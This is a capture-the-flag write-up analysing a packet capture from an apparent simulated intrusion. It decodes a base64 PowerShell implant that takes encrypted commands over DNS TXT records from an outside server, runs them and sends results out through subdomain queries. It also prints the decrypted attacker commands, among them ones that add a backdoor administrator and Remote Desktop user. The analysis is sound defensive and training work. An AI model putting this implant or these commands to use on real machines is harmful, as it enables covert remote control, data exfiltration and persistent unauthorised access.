# Automation

```
Vinyr's threat intelligence is monitoring closely all APT groups from every possible galaxy, especially the most dangerous one, longhir. As stated by an anonymous threat intelligence officer, the malicious actors tend to automate their initial post-exploitation enumeration so they can have less on-keyboard time. You can find such an example in the provided network capture generated by a recent incident. Analyse it and find out what they are up to.
```



### script
in http traffic we find a GET request to /desktop.png, but it is not an image instead a b64 encoded string

```txt
ZnVuY3Rpb24gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QoJGtleSwgJElWKSB7CiAgICAkYWVzTWFuYWdlZCA9IE5ldy1PYmplY3QgIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzTWFuYWdlZCIKICAgICRhZXNNYW5hZ2VkLk1vZGUgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DaXBoZXJNb2RlXTo6Q0JDCiAgICAkYWVzTWFuYWdlZC5QYWRkaW5nID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpaZXJvcwogICAgJGFlc01hbmFnZWQuQmxvY2tTaXplID0gMTI4CiAgICAkYWVzTWFuYWdlZC5LZXlTaXplID0gMjU2CiAgICBpZiAoJElWKSB7CiAgICAgICAgaWYgKCRJVi5nZXRUeXBlKCkuTmFtZSAtZXEgIlN0cmluZyIpIHsKICAgICAgICAgICAgJGFlc01hbmFnZWQuSVYgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRJVikKICAgICAKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRhZXNNYW5hZ2VkLklWID0gJElWCiAgICAgCgogICAgICAgIH0KICAgIH0KICAgIGlmICgka2V5KSB7CgogICAgICAgIGlmICgka2V5LmdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIikgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRrZXkpCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSAka2V5CiAgICAgICAgfQogICAgfQogICAgJGFlc01hbmFnZWQKfQoKZnVuY3Rpb24gQ3JlYXRlLUFlc0tleSgpIHsKICAKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRhZXNNYW5hZ2VkLktleSkKfQoKZnVuY3Rpb24gRW5jcnlwdC1TdHJpbmcoJGtleSwgJHVuZW5jcnlwdGVkU3RyaW5nKSB7CiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1bmVuY3J5cHRlZFN0cmluZykKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleQogICAgJGVuY3J5cHRvciA9ICRhZXNNYW5hZ2VkLkNyZWF0ZUVuY3J5cHRvcigpCiAgICAkZW5jcnlwdGVkRGF0YSA9ICRlbmNyeXB0b3IuVHJhbnNmb3JtRmluYWxCbG9jaygkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpOwogICAgW2J5dGVbXV0gJGZ1bGxEYXRhID0gJGFlc01hbmFnZWQuSVYgKyAkZW5jcnlwdGVkRGF0YQogICAgJGFlc01hbmFnZWQuRGlzcG9zZSgpCiAgICBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRmdWxsRGF0YSkucmVwbGFjZSgiLSIsIiIpCn0KCmZ1bmN0aW9uIERlY3J5cHQtU3RyaW5nKCRrZXksICRlbmNyeXB0ZWRTdHJpbmdXaXRoSVYpIHsKICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGVuY3J5cHRlZFN0cmluZ1dpdGhJVikKICAgICRJViA9ICRieXRlc1swLi4xNV0KICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgICRkZWNyeXB0b3IgPSAkYWVzTWFuYWdlZC5DcmVhdGVEZWNyeXB0b3IoKTsKICAgICR1bmVuY3J5cHRlZERhdGEgPSAkZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJGJ5dGVzLCAxNiwgJGJ5dGVzLkxlbmd0aCAtIDE2KTsKICAgICRhZXNNYW5hZ2VkLkRpc3Bvc2UoKQogICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJHVuZW5jcnlwdGVkRGF0YSkuVHJpbShbY2hhcl0wKQp9CgpmaWx0ZXIgcGFydHMoJHF1ZXJ5KSB7ICR0ID0gJF87IDAuLlttYXRoXTo6Zmxvb3IoJHQubGVuZ3RoIC8gJHF1ZXJ5KSB8ICUgeyAkdC5zdWJzdHJpbmcoJHF1ZXJ5ICogJF8sIFttYXRoXTo6bWluKCRxdWVyeSwgJHQubGVuZ3RoIC0gJHF1ZXJ5ICogJF8pKSB9fSAKJGtleSA9ICJhMUU0TVV0eWNXc3dUbXRyTUhkcWRnPT0iCiRvdXQgPSBSZXNvbHZlLURuc05hbWUgLXR5cGUgVFhUIC1EbnNPbmx5IHdpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODl8U2VsZWN0LU9iamVjdCAtUHJvcGVydHkgU3RyaW5nczsKZm9yICgkbnVtID0gMCA7ICRudW0gLWxlICRvdXQuTGVuZ3RoLTI7ICRudW0rKyl7CiRlbmNyeXB0ZWRTdHJpbmcgPSAkb3V0WyRudW1dLlN0cmluZ3NbMF0KJGJhY2tUb1BsYWluVGV4dCA9IERlY3J5cHQtU3RyaW5nICRrZXkgJGVuY3J5cHRlZFN0cmluZwokb3V0cHV0ID0gaWV4ICRiYWNrVG9QbGFpblRleHQ7JHByID0gRW5jcnlwdC1TdHJpbmcgJGtleSAkb3V0cHV0fHBhcnRzIDMyClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5IHN0YXJ0LndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKZm9yICgkYW5zID0gMDsgJGFucyAtbHQgJHByLmxlbmd0aC0xOyAkYW5zKyspewokZG9tYWluID0gLWpvaW4oJHByWyRhbnNdLCIud2luZG93c2xpdmV1cGRhdGVyLmNvbSIpClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5ICRkb21haW4gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKICAgIH0KUmVzb2x2ZS1EbnNOYW1lIC10eXBlIEEgLURuc09ubHkgZW5kLndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKfQ==
```

decoding gives a powershell script that is being used to covertly perform communication

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=Wm5WdVkzUnBiMjRnUTNKbFlYUmxMVUZsYzAxaGJtRm5aV1JQWW1wbFkzUW9KR3RsZVN3Z0pFbFdLU0I3Q2lBZ0lDQWtZV1Z6VFdGdVlXZGxaQ0E5SUU1bGR5MVBZbXBsWTNRZ0lsTjVjM1JsYlM1VFpXTjFjbWwwZVM1RGNubHdkRzluY21Gd2FIa3VRV1Z6VFdGdVlXZGxaQ0lLSUNBZ0lDUmhaWE5OWVc1aFoyVmtMazF2WkdVZ1BTQmJVM2x6ZEdWdExsTmxZM1Z5YVhSNUxrTnllWEIwYjJkeVlYQm9lUzVEYVhCb1pYSk5iMlJsWFRvNlEwSkRDaUFnSUNBa1lXVnpUV0Z1WVdkbFpDNVFZV1JrYVc1bklEMGdXMU41YzNSbGJTNVRaV04xY21sMGVTNURjbmx3ZEc5bmNtRndhSGt1VUdGa1pHbHVaMDF2WkdWZE9qcGFaWEp2Y3dvZ0lDQWdKR0ZsYzAxaGJtRm5aV1F1UW14dlkydFRhWHBsSUQwZ01USTRDaUFnSUNBa1lXVnpUV0Z1WVdkbFpDNUxaWGxUYVhwbElEMGdNalUyQ2lBZ0lDQnBaaUFvSkVsV0tTQjdDaUFnSUNBZ0lDQWdhV1lnS0NSSlZpNW5aWFJVZVhCbEtDa3VUbUZ0WlNBdFpYRWdJbE4wY21sdVp5SXBJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0pHRmxjMDFoYm1GblpXUXVTVllnUFNCYlUzbHpkR1Z0TGtOdmJuWmxjblJkT2pwR2NtOXRRbUZ6WlRZMFUzUnlhVzVuS0NSSlZpa0tJQ0FnSUNBS0lDQWdJQ0FnSUNCOUNpQWdJQ0FnSUNBZ1pXeHpaU0I3Q2lBZ0lDQWdJQ0FnSUNBZ0lDUmhaWE5OWVc1aFoyVmtMa2xXSUQwZ0pFbFdDaUFnSUNBZ0Nnb2dJQ0FnSUNBZ0lIMEtJQ0FnSUgwS0lDQWdJR2xtSUNna2EyVjVLU0I3Q2dvZ0lDQWdJQ0FnSUdsbUlDZ2thMlY1TG1kbGRGUjVjR1VvS1M1T1lXMWxJQzFsY1NBaVUzUnlhVzVuSWlrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0FrWVdWelRXRnVZV2RsWkM1TFpYa2dQU0JiVTNsemRHVnRMa052Ym5abGNuUmRPanBHY205dFFtRnpaVFkwVTNSeWFXNW5LQ1JyWlhrcENpQWdJQ0FnSUNBZ2ZRb2dJQ0FnSUNBZ0lHVnNjMlVnZXdvZ0lDQWdJQ0FnSUNBZ0lDQWtZV1Z6VFdGdVlXZGxaQzVMWlhrZ1BTQWthMlY1Q2lBZ0lDQWdJQ0FnZlFvZ0lDQWdmUW9nSUNBZ0pHRmxjMDFoYm1GblpXUUtmUW9LWm5WdVkzUnBiMjRnUTNKbFlYUmxMVUZsYzB0bGVTZ3BJSHNLSUNBS0lDQWdJQ1JoWlhOTllXNWhaMlZrSUQwZ1EzSmxZWFJsTFVGbGMwMWhibUZuWldSUFltcGxZM1FnSkd0bGVTQWtTVllLSUNBZ0lGdFRlWE4wWlcwdVEyOXVkbVZ5ZEYwNk9sUnZRbUZ6WlRZMFUzUnlhVzVuS0NSaFpYTk5ZVzVoWjJWa0xrdGxlU2tLZlFvS1puVnVZM1JwYjI0Z1JXNWpjbmx3ZEMxVGRISnBibWNvSkd0bGVTd2dKSFZ1Wlc1amNubHdkR1ZrVTNSeWFXNW5LU0I3Q2lBZ0lDQWtZbmwwWlhNZ1BTQmJVM2x6ZEdWdExsUmxlSFF1Ulc1amIyUnBibWRkT2pwVlZFWTRMa2RsZEVKNWRHVnpLQ1IxYm1WdVkzSjVjSFJsWkZOMGNtbHVaeWtLSUNBZ0lDUmhaWE5OWVc1aFoyVmtJRDBnUTNKbFlYUmxMVUZsYzAxaGJtRm5aV1JQWW1wbFkzUWdKR3RsZVFvZ0lDQWdKR1Z1WTNKNWNIUnZjaUE5SUNSaFpYTk5ZVzVoWjJWa0xrTnlaV0YwWlVWdVkzSjVjSFJ2Y2lncENpQWdJQ0FrWlc1amNubHdkR1ZrUkdGMFlTQTlJQ1JsYm1OeWVYQjBiM0l1VkhKaGJuTm1iM0p0Um1sdVlXeENiRzlqYXlna1lubDBaWE1zSURBc0lDUmllWFJsY3k1TVpXNW5kR2dwT3dvZ0lDQWdXMko1ZEdWYlhWMGdKR1oxYkd4RVlYUmhJRDBnSkdGbGMwMWhibUZuWldRdVNWWWdLeUFrWlc1amNubHdkR1ZrUkdGMFlRb2dJQ0FnSkdGbGMwMWhibUZuWldRdVJHbHpjRzl6WlNncENpQWdJQ0JiVTNsemRHVnRMa0pwZEVOdmJuWmxjblJsY2wwNk9sUnZVM1J5YVc1bktDUm1kV3hzUkdGMFlTa3VjbVZ3YkdGalpTZ2lMU0lzSWlJcENuMEtDbVoxYm1OMGFXOXVJRVJsWTNKNWNIUXRVM1J5YVc1bktDUnJaWGtzSUNSbGJtTnllWEIwWldSVGRISnBibWRYYVhSb1NWWXBJSHNLSUNBZ0lDUmllWFJsY3lBOUlGdFRlWE4wWlcwdVEyOXVkbVZ5ZEYwNk9rWnliMjFDWVhObE5qUlRkSEpwYm1jb0pHVnVZM0o1Y0hSbFpGTjBjbWx1WjFkcGRHaEpWaWtLSUNBZ0lDUkpWaUE5SUNSaWVYUmxjMXN3TGk0eE5WMEtJQ0FnSUNSaFpYTk5ZVzVoWjJWa0lEMGdRM0psWVhSbExVRmxjMDFoYm1GblpXUlBZbXBsWTNRZ0pHdGxlU0FrU1ZZS0lDQWdJQ1JrWldOeWVYQjBiM0lnUFNBa1lXVnpUV0Z1WVdkbFpDNURjbVZoZEdWRVpXTnllWEIwYjNJb0tUc0tJQ0FnSUNSMWJtVnVZM0o1Y0hSbFpFUmhkR0VnUFNBa1pHVmpjbmx3ZEc5eUxsUnlZVzV6Wm05eWJVWnBibUZzUW14dlkyc29KR0o1ZEdWekxDQXhOaXdnSkdKNWRHVnpMa3hsYm1kMGFDQXRJREUyS1RzS0lDQWdJQ1JoWlhOTllXNWhaMlZrTGtScGMzQnZjMlVvS1FvZ0lDQWdXMU41YzNSbGJTNVVaWGgwTGtWdVkyOWthVzVuWFRvNlZWUkdPQzVIWlhSVGRISnBibWNvSkhWdVpXNWpjbmx3ZEdWa1JHRjBZU2t1VkhKcGJTaGJZMmhoY2wwd0tRcDlDZ3BtYVd4MFpYSWdjR0Z5ZEhNb0pIRjFaWEo1S1NCN0lDUjBJRDBnSkY4N0lEQXVMbHR0WVhSb1hUbzZabXh2YjNJb0pIUXViR1Z1WjNSb0lDOGdKSEYxWlhKNUtTQjhJQ1VnZXlBa2RDNXpkV0p6ZEhKcGJtY29KSEYxWlhKNUlDb2dKRjhzSUZ0dFlYUm9YVG82YldsdUtDUnhkV1Z5ZVN3Z0pIUXViR1Z1WjNSb0lDMGdKSEYxWlhKNUlDb2dKRjhwS1NCOWZTQUtKR3RsZVNBOUlDSmhNVVUwVFZWMGVXTlhjM2RVYlhSeVRVaGtjV1JuUFQwaUNpUnZkWFFnUFNCU1pYTnZiSFpsTFVSdWMwNWhiV1VnTFhSNWNHVWdWRmhVSUMxRWJuTlBibXg1SUhkcGJtUnZkM05zYVhabGRYQmtZWFJsY2k1amIyMGdMVk5sY25abGNpQXhORGN1TVRneUxqRTNNaTR4T0RsOFUyVnNaV04wTFU5aWFtVmpkQ0F0VUhKdmNHVnlkSGtnVTNSeWFXNW5jenNLWm05eUlDZ2tiblZ0SUQwZ01DQTdJQ1J1ZFcwZ0xXeGxJQ1J2ZFhRdVRHVnVaM1JvTFRJN0lDUnVkVzByS3lsN0NpUmxibU55ZVhCMFpXUlRkSEpwYm1jZ1BTQWtiM1YwV3lSdWRXMWRMbE4wY21sdVozTmJNRjBLSkdKaFkydFViMUJzWVdsdVZHVjRkQ0E5SUVSbFkzSjVjSFF0VTNSeWFXNW5JQ1JyWlhrZ0pHVnVZM0o1Y0hSbFpGTjBjbWx1Wndva2IzVjBjSFYwSUQwZ2FXVjRJQ1JpWVdOclZHOVFiR0ZwYmxSbGVIUTdKSEJ5SUQwZ1JXNWpjbmx3ZEMxVGRISnBibWNnSkd0bGVTQWtiM1YwY0hWMGZIQmhjblJ6SURNeUNsSmxjMjlzZG1VdFJHNXpUbUZ0WlNBdGRIbHdaU0JCSUMxRWJuTlBibXg1SUhOMFlYSjBMbmRwYm1SdmQzTnNhWFpsZFhCa1lYUmxjaTVqYjIwZ0xWTmxjblpsY2lBeE5EY3VNVGd5TGpFM01pNHhPRGtLWm05eUlDZ2tZVzV6SUQwZ01Ec2dKR0Z1Y3lBdGJIUWdKSEJ5TG14bGJtZDBhQzB4T3lBa1lXNXpLeXNwZXdva1pHOXRZV2x1SUQwZ0xXcHZhVzRvSkhCeVd5Umhibk5kTENJdWQybHVaRzkzYzJ4cGRtVjFjR1JoZEdWeUxtTnZiU0lwQ2xKbGMyOXNkbVV0Ukc1elRtRnRaU0F0ZEhsd1pTQkJJQzFFYm5OUGJteDVJQ1JrYjIxaGFXNGdMVk5sY25abGNpQXhORGN1TVRneUxqRTNNaTR4T0RrS0lDQWdJSDBLVW1WemIyeDJaUzFFYm5OT1lXMWxJQzEwZVhCbElFRWdMVVJ1YzA5dWJIa2daVzVrTG5kcGJtUnZkM05zYVhabGRYQmtZWFJsY2k1amIyMGdMVk5sY25abGNpQXhORGN1TVRneUxqRTNNaTR4T0RrS2ZRPT0K

Looking at the script, we see it is using DNS to receive commands and return the output. 

commands are read from a TXT record 

```powershell
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
```

they are decrypted and then executed, and the result is returned by making a DNS request with the output chunked and appended as a subdomain to the windowsliveupdater.com domain

However! since we have the key now from reading the script, we can decrypt and read the communication 

### commands

from the DNS TXT record response

```
 {...........windowsliveupdater.com..... {...........windowsliveupdater.com..............,.-,Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=.........,.-,hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=.........,.-,58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=.........,...eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru.........,...BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=.........,...vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=.........,.A@M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh
```

load the script into powershell (I found out you can run Powershell in Linux!), use provided Decrypt-String function with the provided key from the script "a1E4MUtycWswTmtrMHdqdg==" to see commands

```powershell
PS /home/kali/Documents/CTF/rough/cyber_apoc_ctf/2022/automation> . .\script.ps1                                                                                                                                                           PS /home/kali/Documents/CTF/rough/cyber_apoc_ctf/2022/automation> Decrypt-String "a1E4MUtycWswTmtrMHdqdg==" "Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws="

hostname

PS /home/kali/Documents/CTF/rough/cyber_apoc_ctf/2022/automation> Decrypt-String "a1E4MUtycWswTmtrMHdqdg==" "hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA="   

whoami

PS /home/kali/Documents/CTF/rough/cyber_apoc_ctf/2022/automation> Decrypt-String "a1E4MUtycWswTmtrMHdqdg==" "58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s="                                                                                 

ipconfig

PS /home/kali/Documents/CTF/rough/cyber_apoc_ctf/2022/automation> Decrypt-String "a1E4MUtycWswTmtrMHdqdg==" "eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru"

wmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /value

PS /home/kali/Documents/CTF/rough/cyber_apoc_ctf/2022/automation> Decrypt-String "a1E4MUtycWswTmtrMHdqdg==" "BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0="

net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup "Remote Desktop Users" /add DefaultUsr

PS /home/kali/Documents/CTF/rough/cyber_apoc_ctf/2022/automation> Decrypt-String "a1E4MUtycWswTmtrMHdqdg==" "M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh"                                                             

net start TermService

```

### responses

https://osqa-ask.wireshark.org/questions/48648/tshark-print-dns-query-hostname-and-http-hostnames/

to filter DNS requests with hostnames, and with responses omitted to prevent duplicates

```
tshark -r capture.pcap -T fields -e frame.number -e frame.protocols -e dns.qry.name  -Y "dns.qry.name and dns.flags.response == 0"
```

in all below I have reconstructed the hex string from the subdomains. I use the same cyberchef recipe as in the 4th example throughout

#### 1st

```
CC1C9AC2958A2E63609272E2B4F8F43632A806549B03AB7E4EB39771AEDA4A1BC1006AC8A03F9776B08321BD6D5247BB
```


```
intergalacticopcenter
```

#### 2nd

```
7679895D1CF7C07BB6A348E1AA4AFC655958A6856F1A34AAD5E97EA55B08767035F2497E5836EA0ECA1F1280F59742A3
```

```
intergalacticop\sysadmin........


```

#### 3rd 

```
09E28DD82C14BC32513652DAC2F2C27B0D73A3288A980D8FCEF94BDDCF9E28222A1CA17BB2D90FCD615885634879041420FC39C684A9E371CC3A06542B6660055840BD94CCE65E23613925B4D9D2BA5318EA75BC653004D45D505ED62567017A6FA4E7593D83092F67A81082D9930E99BA20E34AACC4774F067442C6622F5DA2A9B09FF558A8DF000ECBD37804CE663E3521599BC7591005AB6799C57068CF0DC6884CECF01C0CD44FD6B82DB788B35D62F02E4CAA1D973FBECC235AE9F40254C63D3C93C89930DA2C4F42D9FC123D8BAB00ACAB5198AFCC8C6ACD81B19CD264CC6353668CEA4C88C8AEEA1D58980022DA8FA2E917F17C28608818BF550FEA66973B5A8355258AB0AA281AD88F5B9EB103AC666FE09A1D449736335C09484D271C301C6D5780AB2C9FA333BE3B0185BF071FB1205C4DBEAA2241168B0748902A6CE14903C7C47E7C87311044CB9873A4
```


```
Windows IP Configuration   Ethernet adapter Ethernet:     Connection-specific DNS Suffix  . : home    Link-local IPv6 Address . . . . . : fe80::fdbd:2c54:d6b:c384%6    IPv4 Address. . . . . . . . . . . : 10.0.2.15    Subnet Mask . . . . . . . . . . . : 255.255.255.0    Default Gateway . . . . . . . . . : 10.0.2.2.....
```

#### 4th


filtered domains 4th command
```
ECABC349D27C0B0FFFD1ACEEDBE06BB6.windowsliveupdater.com
C2EB000EE4F9B35D6F001500E85642A2.windowsliveupdater.com
DCC8F1BE2CF4D667F458C1DE46D24B1C.windowsliveupdater.com
2E0F5D94E52649C70402C1B0A2FF7B49.windowsliveupdater.com
FC32DDD67F275307A74B2C4D0864B3F0.windowsliveupdater.com
486186DA9443EB747F717B3911C959DC.windowsliveupdater.com
7E300844D60655410C3988238E615D61.windowsliveupdater.com
6F33D27F63CE4D1E065A416911BC50D4.windowsliveupdater.com
58749599D2CB08DB561988EB2902E05D.windowsliveupdater.com
9886FDDAC2BED6F6DA73637AD2F20CF1.windowsliveupdater.com
99B8CE3D9DEE03C0180C7D1198B49C02.windowsliveupdater.com
769E5EE4EAB896D7D3BB478EA1408167.windowsliveupdater.com
79472A243BFB0852AF372323EC132988.windowsliveupdater.com
3C81A3F2AEB1D3DAAE8496E1DBF97F43.windowsliveupdater.com
5AE40A09203B890C4A174D77CB7026C4.windowsliveupdater.com
E990A6FB6424A7501823AD31D3D6B634.windowsliveupdater.com
4C7971C8D447C078C4471732AD881C39.windowsliveupdater.com
4BC8B1A66E0BED43DDC359269B57D1D5.windowsliveupdater.com
D68DCD2A608BF61716BB47D6FE4D5C9D.windowsliveupdater.com
6E8BB2981F214A8234B0DD0210CA96EB.windowsliveupdater.com
2D6322B0F7F3D748C4C9F8B80EFF5A69.windowsliveupdater.com
21A3D1A8621A49F4D29BC9851D25230B.windowsliveupdater.com

```


```
ECABC349D27C0B0FFFD1ACEEDBE06BB6C2EB000EE4F9B35D6F001500E85642A2DCC8F1BE2CF4D667F458C1DE46D24B1C2E0F5D94E52649C70402C1B0A2FF7B49FC32DDD67F275307A74B2C4D0864B3F0486186DA9443EB747F717B3911C959DC7E300844D60655410C3988238E615D616F33D27F63CE4D1E065A416911BC50D458749599D2CB08DB561988EB2902E05D9886FDDAC2BED6F6DA73637AD2F20CF199B8CE3D9DEE03C0180C7D1198B49C02769E5EE4EAB896D7D3BB478EA140816779472A243BFB0852AF372323EC1329883C81A3F2AEB1D3DAAE8496E1DBF97F435AE40A09203B890C4A174D77CB7026C4E990A6FB6424A7501823AD31D3D6B6344C7971C8D447C078C4471732AD881C394BC8B1A66E0BED43DDC359269B57D1D5D68DCD2A608BF61716BB47D6FE4D5C9D6E8BB2981F214A8234B0DD0210CA96EB2D6322B0F7F3D748C4C9F8B80EFF5A6921A3D1A8621A49F4D29BC9851D25230B
```

gives https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Take_bytes(16,5000,false)Take_bytes(0,16,false/disabled)To_Base64('A-Za-z0-9%2B/%3D'/disabled)AES_Decrypt(%7B'option':'Base64','string':'a1E4MUtycWswTmtrMHdqdg%3D%3D'%7D,%7B'option':'Base64','string':'7KvDSdJ8Cw//0azu2%2BBrtg%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=RUNBQkMzNDlEMjdDMEIwRkZGRDFBQ0VFREJFMDZCQjZDMkVCMDAwRUU0RjlCMzVENkYwMDE1MDBFODU2NDJBMkRDQzhGMUJFMkNGNEQ2NjdGNDU4QzFERTQ2RDI0QjFDMkUwRjVEOTRFNTI2NDlDNzA0MDJDMUIwQTJGRjdCNDlGQzMyRERENjdGMjc1MzA3QTc0QjJDNEQwODY0QjNGMDQ4NjE4NkRBOTQ0M0VCNzQ3RjcxN0IzOTExQzk1OURDN0UzMDA4NDRENjA2NTU0MTBDMzk4ODIzOEU2MTVENjE2RjMzRDI3RjYzQ0U0RDFFMDY1QTQxNjkxMUJDNTBENDU4NzQ5NTk5RDJDQjA4REI1NjE5ODhFQjI5MDJFMDVEOTg4NkZEREFDMkJFRDZGNkRBNzM2MzdBRDJGMjBDRjE5OUI4Q0UzRDlERUUwM0MwMTgwQzdEMTE5OEI0OUMwMjc2OUU1RUU0RUFCODk2RDdEM0JCNDc4RUExNDA4MTY3Nzk0NzJBMjQzQkZCMDg1MkFGMzcyMzIzRUMxMzI5ODgzQzgxQTNGMkFFQjFEM0RBQUU4NDk2RTFEQkY5N0Y0MzVBRTQwQTA5MjAzQjg5MEM0QTE3NEQ3N0NCNzAyNkM0RTk5MEE2RkI2NDI0QTc1MDE4MjNBRDMxRDNENkI2MzQ0Qzc5NzFDOEQ0NDdDMDc4QzQ0NzE3MzJBRDg4MUMzOTRCQzhCMUE2NkUwQkVENDNEREMzNTkyNjlCNTdEMUQ1RDY4RENEMkE2MDhCRjYxNzE2QkI0N0Q2RkU0RDVDOUQ2RThCQjI5ODFGMjE0QTgyMzRCMEREMDIxMENBOTZFQjJENjMyMkIwRjdGM0Q3NDhDNEM5RjhCODBFRkY1QTY5MjFBM0QxQTg2MjFBNDlGNEQyOUJDOTg1MUQyNTIzMEI

```
    companyName=Panaman  displayName=Pan Antivirus 4.0, $part2=4utom4t3_but_y0u_c4nt_h1de}  instanceGuid={CD3EA3C2-91CB-4359-90DC-1E909147B6B0}  onAccessScanningEnabled=TRUE  pathToSignedProductExe=panantivirus://  productHasNotifiedUser=  productState=  productUptoDate=TRUE  productWantsWscNotification
```

`4utom4t3_but_y0u_c4nt_h1de}`

#5th

```
841BDB4E9E5F8BF721B58E8308177B572E9A015967DA5BF11AC9155FC2159C8F610CD82F818B4BDF5E48722DAF4BEEEBABCE30583F503B484BF99020E28A1B8F282A23FEB3A21C3AD89882F5AC0DD3D57D87875231652D0F4431EC37E51A09D57E2854D11003AB6E2F4BFB4F7E2477DAA44FCA3BC6021777F03F139D458C0524

```


```
The command completed successfully.  The command completed successfully.  The command completed successfully. ..
```


#### 6th

```
AE4ABE8A3A88D21DEEA071A72D65A35EF158D9F025897D1843E37B7463EC7833

```

```
Ok. ............
```

#### part 1


after 2 hours(!) of looking for part1 of the flag, I was just randomly decoding strings when I tried the password of the user added in the command `net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup "Remote Desktop Users" /add DefaultUsr`

```bash
echo -n JHBhcnQxPSdIVEJ7eTB1X2M0bl8n | base64 -d
$part1='HTB{y0u_c4n_'
```

annoying, but there you go

HTB{y0u_c4n_4utom4t3_but_y0u_c4nt_h1de}